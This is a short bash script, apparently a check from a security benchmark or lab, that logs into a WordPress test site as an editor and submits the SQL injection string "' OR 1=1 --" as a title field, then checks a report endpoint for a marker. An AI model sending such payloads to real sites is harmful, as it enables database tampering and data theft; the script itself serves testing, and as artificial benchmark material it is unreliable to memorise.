#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
reset_state
login_editor
curl -s -b "$JAR" -X POST "$TARGET/wp-admin/admin-ajax.php" --data-urlencode "action=bench_save_title" --data-urlencode "title=' OR 1=1 --" >/dev/null
curl -s "$TARGET/wp-json/bench-tasks/v1/report" | contains_marker
